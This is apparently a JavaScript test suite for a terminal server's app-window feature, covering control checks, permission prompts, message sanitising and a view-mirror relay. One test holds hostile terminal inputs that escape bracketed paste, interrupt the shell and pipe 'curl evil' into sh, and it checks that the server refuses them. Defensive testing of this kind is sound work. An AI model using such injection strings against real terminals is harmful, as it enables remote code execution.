import assert from "node:assert/strict";
import test from "node:test";
import { TerminayClient } from "@terminay/client-core";
import { createInMemoryTransportPair } from "@terminay/protocol-conformance";
import { FEATURE_CAPABILITIES } from "@terminay/protocol";
import {
  APP_WINDOW_EVENTS,
  APP_WINDOW_MIRROR_EVENTS,
  APP_WINDOW_MIRROR_OPERATIONS,
  APP_WINDOW_OPERATIONS,
  ServerSettingsRepository,
  createServerCoreComposition,
} from "../dist/index.js";

const SERVER = "windows-server";
const identity = { serverId: SERVER, projectId: "project-a", sessionId: "session-a" };

function recordingPty() {
  const processes = [];
  return {
    processes,
    spawn() {
      const data = new Set();
      const exits = new Set();
      const process = {
        pid: 4000 + processes.length,
        writes: [],
        write(bytes) { process.writes.push(typeof bytes === "string" ? bytes : new TextDecoder().decode(bytes)); },
        resize() {},
        kill() {},
        onData(listener) { data.add(listener); return () => data.delete(listener); },
        onExit(listener) { exits.add(listener); return () => exits.delete(listener); },
        emitData(value) { for (const listener of data) listener(new TextEncoder().encode(value)); },
        emitExit() { for (const listener of exits) listener({ exitCode: 0, signal: null }); },
      };
      processes.push(process);
      return process;
    },
  };
}

async function composed({ permissions = {}, appWindows = {} } = {}) {
  let persisted;
  const settings = new ServerSettingsRepository({
    load: async () => structuredClone(persisted),
    commit: async (state) => { persisted = structuredClone(state); },
  });
  const pty = recordingPty();
  const composition = createServerCoreComposition({
    allowUnresolvedTestSessions: true,
    serverId: SERVER,
    serverVersion: "test",
    capabilities: [],
    ptyFactory: pty,
    authenticate: ({ hello }) => ({
      clientId: hello.clientId,
      authScope: hello.clientId === "reader" ? "read" : "write",
      ...(hello.clientId.startsWith("bound-") ? { claims: { projectId: "project-b" } } : {}),
    }),
    settings,
    mcpApprovals: true,
    ...(appWindows === null ? {} : { appWindows }),
  });
  const cleanups = [];
  const connect = async (clientId, { attach = true, mirror = true } = {}) => {
    const pair = createInMemoryTransportPair({ autoOpen: false });
    await pair.open();
    const connection = composition.core.accept(pair.server);
    const task = connection.start();
    const client = new TerminayClient({ transport: pair.client, clientId, capabilities: [FEATURE_CAPABILITIES.appWindows, ...(mirror ? [FEATURE_CAPABILITIES.appWindowMirror] : [])] });
    const hello = await client.connect();
    cleanups.push(async () => {
      await client.close().catch(() => undefined);
      await connection.close().catch(() => undefined);
      await task.catch(() => undefined);
    });
    if (attach) await client.command("terminal.attach", { clientId, identity, fromPosition: 0 });
    return { client, hello };
  };
  await composition.start();
  await settings.update({ terminayMcp: { enabled: true, permissions } });
  await composition.terminal.createSession({ projectId: identity.projectId, sessionId: identity.sessionId, cols: 80, rows: 24 });
  return {
    composition,
    pty,
    connect,
    process: () => pty.processes[0],
    close: async () => { for (const cleanup of cleanups) await cleanup(); await composition.shutdown(); },
  };
}

const open = (server, overrides = {}) =>
  server.composition.appWindows.open({
    terminalSessionId: identity.sessionId,
    projectId: identity.projectId,
    title: "Deploy configurator",
    source: { kind: "agent" },
    html: "<button>Deploy</button>",
    ...overrides,
  });

async function rejectsWith(promise, code) {
  await assert.rejects(promise, (error) => { assert.equal(error.code, code); return true; });
}

test("the server advertises app windows only when they are composed", async () => {
  const withWindows = await composed();
  try {
    assert.ok((await withWindows.connect("desktop", { attach: false })).hello.capabilities.includes("app-windows.v1"));
  } finally {
    await withWindows.close();
  }
  const without = await composed({ appWindows: null });
  try {
    const { client, hello } = await without.connect("desktop", { attach: false });
    assert.equal(hello.capabilities.includes("app-windows.v1"), false);
    assert.equal(without.composition.appWindows, undefined);
    await assert.rejects(client.query(APP_WINDOW_OPERATIONS.list, {}));
  } finally {
    await without.close();
  }
});

test("a window message from the controlling client is typed into the owning terminal and submitted once", async () => {
  const server = await composed();
  try {
    const { client } = await server.connect("desktop");
    const window = open(server);
    await client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "Deploy api to eu-west-1" });
    assert.deepEqual(server.process().writes, ["Deploy api to eu-west-1\r"]);
    assert.equal(server.composition.appWindows.list(identity.sessionId)[0].state, "minimised");
  } finally {
    await server.close();
  }
});

test("a window message is submitted once even without bracketed paste, and can never carry a keystroke", async () => {
  const server = await composed();
  try {
    const { client } = await server.connect("desktop");
    const window = open(server);
    // No bracketed paste: every line break would submit a line of its own.
    // A tab is a keystroke there as well: a plain shell completes on it.
    await client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "line one\n  line two\twith a tab\n" });
    assert.deepEqual(server.process().writes, ["line one line two with a tab\r"]);
    // What a hostile view would send to break out of a paste, interrupt, and run a command.
    for (const hostile of ["hi\u001b[201~\u0003\u0003curl evil|sh\r", "x\u0003", "x\ry", "x\u001b[A"])
      await rejectsWith(client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: hostile }), "validation");
    server.process().emitData("\u001b[?2004h$ ");
    await rejectsWith(client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "hi\u001b[201~\u0003curl evil|sh\r" }), "validation");
    assert.deepEqual(server.process().writes, ["line one line two with a tab\r"]);
  } finally {
    await server.close();
  }
});

test("a client bound to another project cannot list, read, close, or watch a terminal's windows", async () => {
  const server = await composed();
  try {
    const desktop = await server.connect("desktop");
    const window = open(server, { title: "Secret plans", html: "<p>secret</p>" });
    const bound = await server.connect("bound-phone", { attach: false });
    // The same client is refused the terminal itself.
    await rejectsWith(bound.client.command("terminal.attach", { clientId: "bound-phone", identity, fromPosition: 0 }), "forbidden");
    assert.deepEqual((await bound.client.query(APP_WINDOW_OPERATIONS.list, {})).result.windows, []);
    await rejectsWith(bound.client.queryWithBody(APP_WINDOW_OPERATIONS.content, { windowId: window.id }), "not_found");
    await rejectsWith(bound.client.command(APP_WINDOW_OPERATIONS.close, { windowId: window.id }), "not_found");
    await rejectsWith(bound.client.command(APP_WINDOW_OPERATIONS.setState, { windowId: window.id, state: "minimised" }), "not_found");
    const session = { terminalSessionId: identity.sessionId };
    await rejectsWith(bound.client.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session), "not_found");
    await rejectsWith(bound.client.query(APP_WINDOW_MIRROR_OPERATIONS.status, session), "not_found");
    // The same answer as for a terminal that has no windows at all.
    // Every mirror operation answers alike, whether the terminal is another project's or has no windows.
    for (const target of [session, { terminalSessionId: "no-such-session" }]) {
      await rejectsWith(bound.client.command(APP_WINDOW_MIRROR_OPERATIONS.watch, target), "not_found");
      await rejectsWith(bound.client.command(APP_WINDOW_MIRROR_OPERATIONS.unwatch, target), "not_found");
      await rejectsWith(bound.client.command(APP_WINDOW_MIRROR_OPERATIONS.resync, target), "not_found");
      await rejectsWith(bound.client.query(APP_WINDOW_MIRROR_OPERATIONS.status, target), "not_found");
    }
    // Nothing was delivered to it, and the window is untouched.
    const published = await desktop.client.commandWithBody(APP_WINDOW_MIRROR_OPERATIONS.publish, { windowId: window.id, epoch: 1, seq: 0, kind: "snapshot" }, new TextEncoder().encode("[]"));
    assert.equal(published.result.delivered, 0);
    assert.equal((await desktop.client.query(APP_WINDOW_OPERATIONS.list, {})).result.windows.length, 1);
  } finally {
    await server.close();
  }
});

test("a window message uses bracketed paste when the terminal has enabled it", async () => {
  const server = await composed();
  try {
    const { client } = await server.connect("desktop");
    const window = open(server);
    server.process().emitData("\u001b[?2004h$ ");
    await client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "line one\nline two" });
    assert.deepEqual(server.process().writes, ["\u001b[200~line one\nline two\u001b[201~\r"]);
  } finally {
    await server.close();
  }
});

test("a client that does not control the terminal cannot speak for its windows", async () => {
  const server = await composed();
  try {
    await server.connect("desktop");
    const phone = await server.connect("phone");
    const window = open(server);
    await rejectsWith(phone.client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "hi" }), "forbidden");
    await rejectsWith(phone.client.command(APP_WINDOW_OPERATIONS.context, { windowId: window.id, text: "hi" }), "forbidden");
    assert.deepEqual(server.process().writes, []);
    assert.equal(server.composition.appWindows.list(identity.sessionId)[0].state, "open");
    // It can still see that the window exists.
    const listed = await phone.client.query(APP_WINDOW_OPERATIONS.list, {});
    assert.deepEqual(listed.result.windows.map((entry) => entry.title), ["Deploy configurator"]);
  } finally {
    await server.close();
  }
});

test("with no client attached nobody holds control, so a message is refused", async () => {
  const server = await composed();
  try {
    const { client } = await server.connect("desktop", { attach: false });
    const window = open(server);
    await rejectsWith(client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "hi" }), "forbidden");
    assert.deepEqual(server.process().writes, []);
  } finally {
    await server.close();
  }
});

test("Never Allow for Window Messages refuses the view and writes nothing", async () => {
  const server = await composed({ permissions: { windowMessages: "deny" } });
  try {
    const { client } = await server.connect("desktop");
    const window = open(server);
    await rejectsWith(client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "hi" }), "forbidden");
    assert.deepEqual(server.process().writes, []);
    assert.equal(server.composition.appWindows.list(identity.sessionId)[0].state, "open");
  } finally {
    await server.close();
  }
});

test("Ask Permission for Window Messages prompts with the window and the full text, and types only once allowed", async () => {
  const server = await composed({
    permissions: { windowMessages: "ask" },
    appWindows: { terminalTitle: (sessionId) => (sessionId === identity.sessionId ? "Terminal 1" : undefined) },
  });
  try {
    const { client } = await server.connect("desktop");
    const window = open(server);
    const sending = client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "Deploy api to eu-west-1" });
    const approvals = server.composition.mcpApprovals;
    for (let attempt = 0; attempt < 50 && approvals.list().length === 0; attempt += 1) await new Promise((resolve) => setImmediate(resolve));
    const [approval] = approvals.list();
    assert.equal(approval.group, "windowMessages");
    assert.equal(approval.groupLabel, "Window Messages");
    assert.equal(approval.terminalSessionId, identity.sessionId);
    assert.equal(approval.terminalTitle, "Terminal 1");
    assert.match(approval.agent, /Deploy configurator/);
    assert.deepEqual(approval.details, [{ label: "Message", value: "Deploy api to eu-west-1", code: true }]);
    assert.deepEqual(server.process().writes, []);
    approvals.decide(approval.id, "once");
    await sending;
    assert.deepEqual(server.process().writes, ["Deploy api to eu-west-1\r"]);
  } finally {
    await server.close();
  }
});

test("a reader may list windows but not fetch a document or change one", async () => {
  const server = await composed();
  try {
    const reader = await server.connect("reader", { attach: false });
    const window = open(server);
    assert.equal((await reader.client.query(APP_WINDOW_OPERATIONS.list, {})).result.windows.length, 1);
    await assert.rejects(reader.client.query(APP_WINDOW_OPERATIONS.content, { windowId: window.id }));
    await assert.rejects(reader.client.command(APP_WINDOW_OPERATIONS.close, { windowId: window.id }));
    assert.equal(server.composition.appWindows.list().length, 1);
  } finally {
    await server.close();
  }
});

test("clients are told a window changed without being sent its title or document", async () => {
  const server = await composed();
  try {
    const { client } = await server.connect("desktop");
    const seen = [];
    const subscription = await client.subscribe(APP_WINDOW_EVENTS.changed);
    subscription.onEvent((event) => seen.push(event.payload));
    const window = open(server, { title: "Secret plans", html: "<p>secret</p>" });
    for (let attempt = 0; attempt < 50 && seen.length === 0; attempt += 1) await new Promise((resolve) => setImmediate(resolve));
    await subscription.unsubscribe().catch(() => undefined);
    assert.equal(seen.at(-1).windows[0].id, window.id);
    assert.equal(JSON.stringify(seen).includes("Secret"), false);
    assert.equal(JSON.stringify(seen).includes("secret"), false);
  } finally {
    await server.close();
  }
});

test("when another device takes control, it speaks for the terminal's windows and the former holder no longer can", async () => {
  const server = await composed();
  try {
    const desktop = await server.connect("desktop", { attach: false });
    await desktop.client.command("terminal.attach", { clientId: "desktop", identity, fromPosition: 0 });
    const phone = await server.connect("phone", { attach: false });
    const attachedPhone = await phone.client.command("terminal.attach", { clientId: "phone", identity, fromPosition: 0 });
    const window = open(server);
    await desktop.client.command(APP_WINDOW_OPERATIONS.context, { windowId: window.id, text: "from desktop" });
    await rejectsWith(phone.client.command(APP_WINDOW_OPERATIONS.context, { windowId: window.id, text: "from phone" }), "forbidden");

    await phone.client.command("terminal.presentation", { clientId: "phone", identity, attachmentId: attachedPhone.result.attachmentId, mode: "takeover" });

    await rejectsWith(desktop.client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "stale" }), "forbidden");
    await phone.client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "from the phone" });
    assert.deepEqual(server.process().writes, ["from the phone\r"]);
    // The window did not change: the new holder rebuilds the view from the
    // same server record.
    const listed = await phone.client.query(APP_WINDOW_OPERATIONS.list, {});
    assert.deepEqual(listed.result.windows.map((entry) => entry.id), [window.id]);
  } finally {
    await server.close();
  }
});

test("a terminal's windows end when its process exits", async () => {
  const server = await composed();
  try {
    await server.connect("desktop");
    open(server);
    assert.equal(server.composition.appWindows.list().length, 1);
    server.process().emitExit();
    for (let attempt = 0; attempt < 50 && server.composition.appWindows.list().length > 0; attempt += 1) await new Promise((resolve) => setImmediate(resolve));
    assert.equal(server.composition.appWindows.list().length, 0);
  } finally {
    await server.close();
  }
});

// --- the view mirror relay (ADR-0039) ---

const settle = async () => { for (let turn = 0; turn < 20; turn += 1) await new Promise((resolve) => setImmediate(resolve)); };
const bytes = (text) => new TextEncoder().encode(text);
const text = (body) => new TextDecoder().decode(body ?? new Uint8Array());

async function listen(client, event) {
  const seen = [];
  const subscription = await client.subscribe(event);
  subscription.onEvent((entry) => seen.push(entry.body === undefined ? entry.payload : { ...entry.payload, data: text(entry.body) }));
  return seen;
}

/** A desktop that controls the terminal, a phone that observes it, and one window. */
async function mirrored() {
  const server = await composed();
  const desktop = await server.connect("desktop", { attach: false });
  await desktop.client.command("terminal.attach", { clientId: "desktop", identity, fromPosition: 0 });
  const phone = await server.connect("phone", { attach: false });
  const attachedPhone = await phone.client.command("terminal.attach", { clientId: "phone", identity, fromPosition: 0 });
  const window = open(server);
  const wanted = await listen(desktop.client, APP_WINDOW_MIRROR_EVENTS.wanted);
  const data = await listen(phone.client, APP_WINDOW_MIRROR_EVENTS.data);
  const session = { terminalSessionId: identity.sessionId };
  /** Publish one batch as `client`; the recording is the command's body. */
  const publish = (client, overrides = {}, recording = "[\"snapshot\"]") =>
    client.commandWithBody(APP_WINDOW_MIRROR_OPERATIONS.publish, { windowId: window.id, epoch: 1, seq: 0, kind: "snapshot", ...overrides }, bytes(recording));
  return { server, desktop: desktop.client, phone: phone.client, attachedPhone, window, wanted, data, session, publish };
}

test("the server advertises the view mirror with app windows", async () => {
  const server = await composed();
  try {
    assert.ok((await server.connect("desktop", { attach: false })).hello.capabilities.includes("app-window-mirror.v1"));
  } finally {
    await server.close();
  }
});

test("a recording from the controlling client reaches the clients watching that terminal, and only them", async () => {
  const { server, desktop, phone, window, wanted, data, session, publish } = await mirrored();
  try {
    const bystander = await server.connect("tablet");
    const bystanderData = await listen(bystander.client, APP_WINDOW_MIRROR_EVENTS.data);
    const holderData = await listen(desktop, APP_WINDOW_MIRROR_EVENTS.data);

    // Nobody is watching yet, so the controlling client is not asked to record.
    assert.equal((await desktop.query(APP_WINDOW_MIRROR_OPERATIONS.status, session)).result.wanted, false);
    assert.equal((await publish(desktop)).result.delivered, 0);

    await phone.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session);
    await settle();
    assert.deepEqual(wanted, [{ clientId: "desktop", terminalSessionId: identity.sessionId, wanted: true }]);
    assert.equal((await desktop.query(APP_WINDOW_MIRROR_OPERATIONS.status, session)).result.wanted, true);

    assert.equal((await publish(desktop)).result.delivered, 1);
    await publish(desktop, { seq: 1, kind: "events" }, "[\"change\"]");
    await settle();
    assert.deepEqual(data.map(({ windowId, contentRevision, epoch, seq, kind, data: recording }) => ({ windowId, contentRevision, epoch, seq, kind, recording })), [
      { windowId: window.id, contentRevision: window.contentRevision, epoch: 1, seq: 0, kind: "snapshot", recording: "[\"snapshot\"]" },
      { windowId: window.id, contentRevision: window.contentRevision, epoch: 1, seq: 1, kind: "events", recording: "[\"change\"]" },
    ]);
    // A client that is attached but not watching gets none of it, nor does the publisher.
    assert.deepEqual(bystanderData, []);
    assert.deepEqual(holderData, []);

    // Unwatching stops the recording.
    await phone.command(APP_WINDOW_MIRROR_OPERATIONS.unwatch, session);
    await settle();
    assert.deepEqual(wanted.at(-1), { clientId: "desktop", terminalSessionId: identity.sessionId, wanted: false });
    assert.equal((await desktop.query(APP_WINDOW_MIRROR_OPERATIONS.status, session)).result.wanted, false);
  } finally {
    await server.close();
  }
});

test("only the controlling client may publish a recording, before and after control moves", async () => {
  const { server, desktop, phone, attachedPhone, data, session, publish } = await mirrored();
  try {
    await phone.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session);
    await rejectsWith(publish(phone), "forbidden");

    const desktopData = await listen(desktop, APP_WINDOW_MIRROR_EVENTS.data);
    const phoneWanted = await listen(phone, APP_WINDOW_MIRROR_EVENTS.wanted);
    await phone.command("terminal.presentation", { clientId: "phone", identity, attachmentId: attachedPhone.result.attachmentId, mode: "takeover" });
    // What the former holder still had in flight is refused.
    await rejectsWith(publish(desktop, { seq: 1, kind: "events" }), "forbidden");

    // The roles swap: the desktop watches, and the phone is asked to record.
    await phone.command(APP_WINDOW_MIRROR_OPERATIONS.unwatch, session);
    await desktop.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session);
    await settle();
    assert.deepEqual(phoneWanted.at(-1), { clientId: "phone", terminalSessionId: identity.sessionId, wanted: true });
    await publish(phone, {}, "[\"from the phone\"]");
    await settle();
    assert.deepEqual(desktopData.map((entry) => entry.data), ["[\"from the phone\"]"]);
    assert.deepEqual(data, []);
  } finally {
    await server.close();
  }
});

test("a recording is bounded, and the server keeps none of it", async () => {
  const { server, desktop, phone, data, session, publish } = await mirrored();
  try {
    await phone.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session);
    const large = "x".repeat(300 * 1024);
    // More than a batch of changes may hold, but within a snapshot.
    await rejectsWith(publish(desktop, { seq: 1, kind: "events" }, large), "validation");
    await publish(desktop, {}, large);
    // One part of a snapshot at the limit goes through; one byte more does not.
    const full = "y".repeat(512 * 1024);
    await publish(desktop, { epoch: 2 }, full);
    await rejectsWith(publish(desktop, { epoch: 3 }, `${full}y`), "validation");
    // Multi-byte text is measured in bytes.
    await rejectsWith(publish(desktop, { seq: 1, kind: "events" }, "é".repeat(150 * 1024)), "validation");
    await rejectsWith(publish(desktop, { kind: "video" }), "validation");
    // How many parts a snapshot comes in travels with it; only a snapshot has parts.
    await rejectsWith(publish(desktop, { parts: 1 }), "validation");
    await rejectsWith(publish(desktop, { parts: 129 }), "validation");
    await rejectsWith(publish(desktop, { seq: 1, kind: "events", parts: 2 }), "validation");
    await rejectsWith(publish(desktop, { seq: -1 }), "validation");
    await rejectsWith(publish(desktop, { windowId: "win_missing" }), "not_found");
    await settle();
    assert.deepEqual(data.map((entry) => entry.data.length), [large.length, full.length]);
    // A snapshot in three parts arrives as three messages, each saying so.
    for (const seq of [0, 1, 2]) await publish(desktop, { epoch: 9, seq, parts: 3 }, `part-${seq}`);
    await settle();
    assert.deepEqual(data.slice(-3).map(({ seq, parts, data: recording }) => [seq, parts, recording]), [[0, 3, "part-0"], [1, 3, "part-1"], [2, 3, "part-2"]]);

    // Nothing of a delivered batch stays in the relay.
    const marker = `KEPT-NOWHERE-${"z".repeat(64)}`;
    await publish(desktop, { epoch: 4 }, JSON.stringify([marker]));
    await settle();
    assert.equal(data.at(-1).data.includes(marker), true);
    const seen = new Set();
    const holds = (value) => {
      if (typeof value === "string") return value.includes(marker);
      if (value instanceof Uint8Array) return text(value).includes(marker);
      if (typeof value !== "object" || value === null || seen.has(value)) return false;
      seen.add(value);
      if (value instanceof Map) return [...value.entries()].some(([key, entry]) => holds(key) || holds(entry));
      if (value instanceof Set) return [...value].some(holds);
      return Object.values(value).some(holds);
    };
    assert.equal(holds(server.composition.appWindows.mirror), false);
  } finally {
    await server.close();
  }
});

test("snapshot requests from several watchers are one request, and a repeated one always gets through", async () => {
  const { server, desktop, phone, wanted, session, publish } = await mirrored();
  try {
    // Only a watcher may ask.
    await rejectsWith(phone.command(APP_WINDOW_MIRROR_OPERATIONS.resync, session), "forbidden");
    await phone.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session);
    await settle();
    assert.equal(wanted.length, 1);
    // A second watcher arriving while that snapshot is outstanding adds nothing.
    const tablet = await server.connect("tablet");
    await tablet.client.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session);
    await settle();
    assert.equal(wanted.length, 1);

    // Once the snapshot has been sent, two watchers asking for the next one are one request.
    await publish(desktop);
    await phone.command(APP_WINDOW_MIRROR_OPERATIONS.resync, session);
    await tablet.client.command(APP_WINDOW_MIRROR_OPERATIONS.resync, session);
    await settle();
    assert.equal(wanted.length, 2);
    assert.deepEqual(wanted.at(-1), { clientId: "desktop", terminalSessionId: identity.sessionId, wanted: true });

    // A watcher that asks again has waited and got nothing: its request goes
    // through, so a request the controlling client missed cannot strand it.
    await phone.command(APP_WINDOW_MIRROR_OPERATIONS.resync, session);
    await settle();
    assert.equal(wanted.length, 3);

    // A later watcher needs a snapshot too, once the last one has been sent.
    await publish(desktop, { epoch: 2 });
    const laptop = await server.connect("laptop");
    await laptop.client.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session);
    await settle();
    assert.equal(wanted.length, 4);
  } finally {
    await server.close();
  }
});

test("a watcher that disconnects stops the recording, and a client that cannot show a mirror never starts one", async () => {
  const { server, desktop, wanted, session } = await mirrored();
  try {
    const old = await server.connect("old-phone", { mirror: false });
    await rejectsWith(old.client.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session), "unavailable");
    await settle();
    assert.deepEqual(wanted, []);
    await rejectsWith(desktop.command(APP_WINDOW_MIRROR_OPERATIONS.watch, { terminalSessionId: "no-such-session" }), "not_found");

    const tablet = await server.connect("tablet");
    await tablet.client.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session);
    await settle();
    assert.equal(wanted.at(-1).wanted, true);
    await tablet.client.close();
    for (let attempt = 0; attempt < 50 && wanted.at(-1).wanted; attempt += 1) await settle();
    assert.equal(wanted.at(-1).wanted, false);
    assert.equal((await desktop.query(APP_WINDOW_MIRROR_OPERATIONS.status, session)).result.wanted, false);
  } finally {
    await server.close();
  }
});

// --- found by a second review ---

test("a window cannot press Enter on its own: white space is not a message, and one message is all it gets until reopened", async () => {
  const server = await composed();
  try {
    const { client } = await server.connect("desktop");
    const window = open(server);
    const send = (text) => client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text });
    // Each of these would have written a bare Enter, answering whatever the terminal was asking.
    for (const blank of ["\n", " ", "\t", " \n ", "\n\n\n"]) await rejectsWith(send(blank), "validation");
    assert.deepEqual(server.process().writes, []);

    // A burst: one is delivered, the window is minimised, and the rest are refused.
    const outcomes = await Promise.allSettled(Array.from({ length: 20 }, (_unused, index) => send(`message ${index}`)));
    assert.equal(outcomes.filter((outcome) => outcome.status === "fulfilled").length, 1);
    assert.equal(server.process().writes.length, 1);
    await rejectsWith(send("again"), "forbidden");
    assert.equal(server.process().writes.length, 1);

    // Opened again by the user, it may send once more.
    await client.command(APP_WINDOW_OPERATIONS.setState, { windowId: window.id, state: "open" });
    await send("after reopening");
    assert.equal(server.process().writes.length, 2);
  } finally {
    await server.close();
  }
});

test("a second connection that only names the controlling client is not the controller", async () => {
  const server = await composed();
  try {
    const desktop = await server.connect("desktop");
    const window = open(server);
    // The same client id, on a connection that never attached to the terminal.
    const impostor = await server.connect("desktop", { attach: false });
    await rejectsWith(impostor.client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "typed by an impostor" }), "forbidden");
    await rejectsWith(impostor.client.command(APP_WINDOW_OPERATIONS.context, { windowId: window.id, text: "x" }), "forbidden");
    await rejectsWith(impostor.client.commandWithBody(APP_WINDOW_MIRROR_OPERATIONS.publish, { windowId: window.id, epoch: 1, seq: 0, kind: "snapshot" }, new TextEncoder().encode("[]")), "forbidden");
    assert.deepEqual(server.process().writes, []);
    await desktop.client.command(APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "typed by the controller" });
    assert.deepEqual(server.process().writes, ["typed by the controller\r"]);
  } finally {
    await server.close();
  }
});

test("a recording goes to the connection that asked to watch, not to another that names the same client", async () => {
  const { server, desktop, phone, session, publish } = await mirrored();
  try {
    await phone.command(APP_WINDOW_MIRROR_OPERATIONS.watch, session);
    const shadow = await server.connect("phone", { attach: false });
    const shadowData = await listen(shadow.client, APP_WINDOW_MIRROR_EVENTS.data);
    const published = await publish(desktop, {}, "[\"private\"]");
    await settle();
    assert.equal(published.result.delivered, 1);
    assert.deepEqual(shadowData, []);
  } finally {
    await server.close();
  }
});

test("a refusal reaches a feature client with the reason it needs to tell a lapsed lease from a declined permission", async () => {
  const server = await composed({ permissions: { windowMessages: "deny" } });
  try {
    const desktop = await server.connect("desktop");
    const phone = await server.connect("phone");
    const window = open(server);
    const { TerminayClientFacade } = await import("@terminay/client-core");
    // As the workspace calls it: through the facade that wraps a failure.
    const reason = async (client, operation, payload) => {
      try {
        await new TerminayClientFacade(client).command(operation, payload);
        return "accepted";
      } catch (error) {
        const cause = error.cause ?? error;
        return [cause.code, cause.details?.reason];
      }
    };
    assert.deepEqual(await reason(phone.client, APP_WINDOW_OPERATIONS.context, { windowId: window.id, text: "x" }), ["forbidden", "not-controller"]);
    // Never Allow is also "forbidden", and must not look like a lapsed lease.
    assert.deepEqual(await reason(desktop.client, APP_WINDOW_OPERATIONS.message, { windowId: window.id, text: "hi" }), ["forbidden", undefined]);
  } finally {
    await server.close();
  }
});
